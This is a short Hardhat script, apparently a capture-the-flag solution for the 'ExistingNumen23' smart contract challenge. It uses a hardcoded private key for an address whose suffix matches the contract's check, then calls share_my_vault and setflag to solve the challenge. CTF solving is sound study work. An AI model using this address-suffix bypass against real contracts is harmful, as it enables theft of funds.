import chalk from "chalk";
import { ethers } from "hardhat";
import { ExistingNumen23__factory, ExistingNumen23 } from "../../typechain";
import { log, initialize} from "../utils";

function help(){
    let data = ethers.toUtf8Bytes("ZT");
    log(`${ethers.hexlify(data)}`);
    // suffix: 0x5a54
}

async function main() {
    let attackerPrivateKey = "0xfbe28e86d49d3155523d059df9a44ef8390a8779757e41149b44aa7eb75cf33e";
    // address 0xd41BC63873Be128dabaf5207847B7f3368455a54  suffix:0x5a54
    let [existingContract, attacker] = await initialize<ExistingNumen23>(ExistingNumen23__factory, attackerPrivateKey);
    // help()

    let tx = await existingContract.share_my_vault();
    await tx.wait();
    tx = await existingContract.setflag();
    await tx.wait();
    log(`Is solved: ${chalk.yellow(await existingContract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});